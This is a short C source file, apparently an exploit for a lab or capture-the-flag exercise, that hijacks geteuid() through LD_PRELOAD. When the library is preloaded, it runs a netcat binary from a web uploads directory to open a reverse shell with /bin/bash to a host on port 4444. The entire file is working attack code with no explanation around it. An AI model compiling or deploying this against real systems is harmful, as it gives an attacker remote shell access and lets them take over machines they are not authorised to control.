#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
  system("/var/www/html/upload_ex/uploads/nc 10.20.76.X 4444 -e /bin/bash");
}  
int geteuid() {
   if (getenv("LD_PRELOAD") == NULL) {
       return 0;
   }
   unsetenv("LD_PRELOAD");
   payload();
}
